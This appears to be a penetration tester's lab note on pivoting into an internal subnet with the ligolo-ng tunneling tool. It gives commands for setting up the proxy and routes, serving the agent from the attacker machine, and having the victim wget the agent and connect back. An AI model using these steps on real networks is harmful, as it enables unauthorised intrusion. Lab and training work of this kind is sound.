## a) Attacker Machine Setup: (Nigolo-Proxy/Server)

#### a.1) Download agent & proxy on attacker machine 
##### I. Proxy / Server:
``#wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
``#tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
``#chmod +x proxy

##### II. Agent / Client:
``#wget  https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
``#tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
``#chmod +x agent

#### a.2) Setup the ligolo-ng proxy in the attacker machine & ligolo-ng in the victim machine. 
``# sudo ip tuntap add user $(whoami) mode tun ligolo
``# sudo ip route del 192.168.98.0/24 dev tun0
``# sudo ip link set ligolo up
``# sudo ip route add 192.168.98.0/24 dev ligolo
``# ./proxy -selfcert -laddr 0.0.0.0:443
![[Pasted image 20250823201611.png]]

Confirm the route on your attacker machine. The internal IP range is now added in the route.
![[Pasted image 20250823202004.png]]

## b) Victim Machine Setup: (Nigolo-Agent/Client)
#### b.1) Attacker Machine: 
``#cd /home/kali/Desktop
``#python3 -m http.server 8899

#### b.2) Victim Machine: 
``#wget http://10.10.200.225:8899/agent
``# ./agent -connect 10.10.200.225:443 -ignore-cert
![[Pasted image 20250823202706.png]]
--> Connection received between attacker machine & 192.168.98.0/24 subnet.

#### b.3) Attacker Machine:
![[Pasted image 20250823202645.png]]

On the ligolo-ng proxy, check the session & start the tunnel.
```
>>>session  
>>>list_tunnels  
>>>start  
```
![[Pasted image 20250823203239.png]]

Now fire up a new terminal & check that we can now access the internal IP range 192.168.98.0/24 
``#ping 192.168.98.15
![[Pasted image 20250823203134.png]]
